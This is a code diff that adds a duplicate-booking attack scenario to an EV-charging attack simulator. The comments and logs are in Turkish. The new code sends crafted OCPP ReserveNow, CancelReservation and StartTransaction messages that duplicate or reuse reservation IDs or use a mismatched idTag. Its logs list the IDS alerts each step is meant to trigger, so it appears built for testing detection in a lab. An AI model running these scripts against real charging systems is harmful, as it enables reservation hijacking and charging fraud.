@@ -10,6 +10,7 @@ import asyncio
 import websockets
 import json
 from typing import List, Dict
+from datetime import datetime
 from loguru import logger
 from utils.can_handler import CANBusHandler, CANFrame
 
@@ -511,6 +512,257 @@ class AttackSimulator:
         logger.info("  - Yanlış kapasite planlama")
         logger.info("  - Peak algılama sistemi bypass")
     
+    # Saldırı 9: Duplicate Booking Attack (Senaryo #5)
+    async def duplicate_booking_attack_async(
+        self,
+        csms_url: str = "ws://localhost:9000",
+        scenario: str = "duplicate_id"
+    ):
+        """
+        Senaryo #5: Sahte Rezervasyon (Duplicate Booking) saldırısı.
+        
+        Senaryolar:
+        - "duplicate_id": Aynı reservationId ile iki ReserveNow isteği
+        - "multiple_connector": Aynı connectorId için çoklu rezervasyon
+        - "id_reuse": Daha önce kullanılmış reservationId tekrar kullanımı
+        - "mismatch_transaction": Rezervasyondaki idTag ile farklı idTag ile şarj başlatma
+        
+        Args:
+            csms_url: CSMS WebSocket URL'i
+            scenario: Saldırı senaryosu tipi
+        """
+        logger.warning(f"🚨 SALDIRI: Duplicate Booking Attack başlatılıyor...")
+        logger.info(f"   Senaryo: {scenario}")
+        logger.info(f"   Hedef: OCPP ReserveNow Mekanizması")
+        
+        try:
+            async with websockets.connect(csms_url, subprotocols=['ocpp1.6']) as ws:
+                logger.info("   ✓ CSMS'e bağlandı")
+                
+                # BootNotification gönder
+                boot_msg = [
+                    2,  # CALL
+                    "boot-001",
+                    "BootNotification",
+                    {
+                        "chargePointVendor": "AttackerVendor",
+                        "chargePointModel": "DuplicateBookingBot"
+                    }
+                ]
+                await ws.send(json.dumps(boot_msg))
+                logger.info("   📤 BootNotification gönderildi")
+                
+                # BootNotification yanıtını bekle
+                response = await ws.recv()
+                logger.debug(f"   📥 BootNotification yanıtı alındı")
+                
+                if scenario == "duplicate_id":
+                    # Senaryo: Aynı reservationId ile iki ReserveNow
+                    reservation_id = "RESERVATION-001"
+                    connector_id = 1
+                    id_tag = "ATTACKER_TAG"
+                    
+                    logger.info(f"   [Adım 1] İlk ReserveNow gönderiliyor...")
+                    logger.info(f"      reservationId: {reservation_id}")
+                    logger.info(f"      connectorId: {connector_id}")
+                    logger.info(f"      idTag: {id_tag}")
+                    
+                    reserve_msg_1 = [
+                        2,
+                        "reserve-001",
+                        "ReserveNow",
+                        {
+                            "connectorId": connector_id,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": id_tag,
+                            "reservationId": reservation_id
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_1))
+                    logger.info("   📤 İlk ReserveNow gönderildi")
+                    
+                    # Yanıtı bekle
+                    response = await ws.recv()
+                    logger.debug(f"   📥 İlk ReserveNow yanıtı alındı")
+                    
+                    await asyncio.sleep(1.0)  # 1 saniye bekle
+                    
+                    logger.warning(f"   [Adım 2] ⚠️  AYNI reservationId ile ikinci ReserveNow gönderiliyor (DUPLICATE!)")
+                    reserve_msg_2 = [
+                        2,
+                        "reserve-002",
+                        "ReserveNow",
+                        {
+                            "connectorId": connector_id,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": "DIFFERENT_TAG",  # Farklı idTag
+                            "reservationId": reservation_id  # AYNI reservationId
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_2))
+                    logger.error("   ⚠️  ÇİFT REZERVASYON ID SALDIRISI GERÇEKLEŞTİRİLDİ!")
+                    logger.info("   [IDS] DUPLICATE_RESERVATION_ID alert'i tetiklenmeli")
+                    
+                    # Yanıtı bekle
+                    response = await ws.recv()
+                    logger.debug(f"   📥 İkinci ReserveNow yanıtı alındı")
+                
+                elif scenario == "multiple_connector":
+                    # Senaryo: Aynı connectorId için çoklu rezervasyon
+                    connector_id = 1
+                    
+                    logger.info(f"   [Adım 1] İlk rezervasyon (connectorId: {connector_id})...")
+                    reserve_msg_1 = [
+                        2,
+                        "reserve-001",
+                        "ReserveNow",
+                        {
+                            "connectorId": connector_id,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": "TAG_001",
+                            "reservationId": "RESERVATION-001"
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_1))
+                    logger.info("   📤 İlk ReserveNow gönderildi")
+                    await ws.recv()  # Yanıtı bekle
+                    
+                    await asyncio.sleep(0.5)
+                    
+                    logger.warning(f"   [Adım 2] ⚠️  AYNI connectorId için ikinci rezervasyon...")
+                    reserve_msg_2 = [
+                        2,
+                        "reserve-002",
+                        "ReserveNow",
+                        {
+                            "connectorId": connector_id,  # AYNI connectorId
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": "TAG_002",
+                            "reservationId": "RESERVATION-002"
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_2))
+                    logger.error("   ⚠️  ÇOKLU CONNECTOR REZERVASYONU SALDIRISI GERÇEKLEŞTİRİLDİ!")
+                    logger.info("   [IDS] MULTIPLE_CONNECTOR_RESERVATIONS alert'i tetiklenmeli")
+                    await ws.recv()  # Yanıtı bekle
+                
+                elif scenario == "id_reuse":
+                    # Senaryo: Daha önce kullanılmış reservationId tekrar kullanımı
+                    reservation_id = "RESERVATION-REUSED"
+                    
+                    logger.info(f"   [Adım 1] İlk rezervasyon (reservationId: {reservation_id})...")
+                    reserve_msg_1 = [
+                        2,
+                        "reserve-001",
+                        "ReserveNow",
+                        {
+                            "connectorId": 1,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": "TAG_001",
+                            "reservationId": reservation_id
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_1))
+                    logger.info("   📤 İlk ReserveNow gönderildi")
+                    await ws.recv()  # Yanıtı bekle
+                    
+                    # Rezervasyonu iptal et (simüle)
+                    await asyncio.sleep(2.0)
+                    cancel_msg = [
+                        2,
+                        "cancel-001",
+                        "CancelReservation",
+                        {"reservationId": reservation_id}
+                    ]
+                    await ws.send(json.dumps(cancel_msg))
+                    logger.info("   📤 CancelReservation gönderildi")
+                    await ws.recv()  # Yanıtı bekle
+                    
+                    await asyncio.sleep(1.0)
+                    
+                    logger.warning(f"   [Adım 2] ⚠️  İPTAL EDİLMİŞ reservationId tekrar kullanılıyor...")
+                    reserve_msg_2 = [
+                        2,
+                        "reserve-002",
+                        "ReserveNow",
+                        {
+                            "connectorId": 2,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": "TAG_002",
+                            "reservationId": reservation_id  # TEKRAR KULLANIM
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg_2))
+                    logger.error("   ⚠️  REZERVASYON ID TEKRAR KULLANIM SALDIRISI GERÇEKLEŞTİRİLDİ!")
+                    logger.info("   [IDS] RESERVATION_ID_REUSE alert'i tetiklenmeli")
+                    await ws.recv()  # Yanıtı bekle
+                
+                elif scenario == "mismatch_transaction":
+                    # Senaryo: Rezervasyondaki idTag ile farklı idTag ile şarj başlatma
+                    reservation_id = "RESERVATION-MISMATCH"
+                    reservation_id_tag = "LEGITIMATE_TAG"
+                    attacker_id_tag = "ATTACKER_TAG"
+                    
+                    logger.info(f"   [Adım 1] Meşru rezervasyon oluşturuluyor...")
+                    reserve_msg = [
+                        2,
+                        "reserve-001",
+                        "ReserveNow",
+                        {
+                            "connectorId": 1,
+                            "expiryDate": "2024-12-31T23:59:59Z",
+                            "idTag": reservation_id_tag,
+                            "reservationId": reservation_id
+                        }
+                    ]
+                    await ws.send(json.dumps(reserve_msg))
+                    logger.info(f"   📤 ReserveNow gönderildi (idTag: {reservation_id_tag})")
+                    await ws.recv()  # Yanıtı bekle
+                    
+                    await asyncio.sleep(1.0)
+                    
+                    logger.warning(f"   [Adım 2] ⚠️  FARKLI idTag ile StartTransaction gönderiliyor...")
+                    start_transaction_msg = [
+                        2,
+                        "start-001",
+                        "StartTransaction",
+                        {
+                            "connectorId": 1,
+                            "idTag": attacker_id_tag,  # FARKLI idTag
+                            "meterStart": 0,
+                            "timestamp": datetime.utcnow().isoformat() + "Z"
+                        }
+                    ]
+                    await ws.send(json.dumps(start_transaction_msg))
+                    logger.error(f"   ⚠️  REZERVASYON-TRANSACTION UYUŞMAZLIĞI SALDIRISI!")
+                    logger.info(f"      Rezervasyon idTag: {reservation_id_tag}")
+                    logger.info(f"      StartTransaction idTag: {attacker_id_tag}")
+                    logger.info("   [IDS] RESERVATION_TRANSACTION_MISMATCH alert'i tetiklenmeli")
+                    await ws.recv()  # Yanıtı bekle
+                
+                else:
+                    logger.error(f"   Bilinmeyen senaryo: {scenario}")
+                    return
+                
+                logger.warning(f"✓ Duplicate Booking Attack tamamlandı")
+                logger.info("")
+                logger.info("Beklenen IDS Alerts:")
+                logger.info("  - DUPLICATE_RESERVATION_ID (Kural-1)")
+                logger.info("  - MULTIPLE_CONNECTOR_RESERVATIONS (Kural-2)")
+                logger.info("  - RESERVATION_ID_REUSE (Kural-3)")
+                logger.info("  - RESERVATION_TRANSACTION_MISMATCH (Kural-5)")
+                logger.info("  - Severity: CRITICAL")
+                logger.info("  - Dashboard: Kırmızı alarm görünmeli")
+        
+        except Exception as e:
+            logger.error(f"   Duplicate Booking saldırısı sırasında hata: {e}")
+    
+    def duplicate_booking_attack(self, **kwargs):
+        """
+        Sync wrapper for duplicate booking attack.
+        """
+        asyncio.run(self.duplicate_booking_attack_async(**kwargs))
+    
     # Kombine saldırı
     def combined_attack(self):
         """
@@ -557,7 +809,7 @@ def main():
     parser.add_argument(
         "--attack",
         type=str,
-        choices=["injection", "flood", "replay", "invalid_id", "entropy", "mitm", "ocpp_flood", "sampling", "fail_open", "combined", "all"],
+        choices=["injection", "flood", "replay", "invalid_id", "entropy", "mitm", "ocpp_flood", "sampling", "fail_open", "duplicate_booking", "combined", "all"],
         default="combined",
         help="Saldırı tipi"
     )
@@ -612,6 +864,15 @@ def main():
         type=int,
         default=100,
         help="DoS saldırısı istek oranı (istek/saniye) - Senaryo #4"
+    )
+    
+    # Senaryo #5: Duplicate Booking Attack
+    parser.add_argument(
+        "--booking-scenario",
+        type=str,
+        choices=["duplicate_id", "multiple_connector", "id_reuse", "mismatch_transaction"],
+        default="duplicate_id",
+        help="Duplicate booking saldırı senaryosu - Senaryo #5"
     )
     
     args = parser.parse_args()
@@ -675,6 +936,12 @@ def main():
                 csms_url=args.csms_url,
                 duration=args.fail_open_duration,
                 dos_rate=args.dos_rate
+            )
+        
+        elif args.attack == "duplicate_booking":
+            simulator.duplicate_booking_attack(
+                csms_url=args.csms_url,
+                scenario=args.booking_scenario
             )
         
         elif args.attack == "combined":
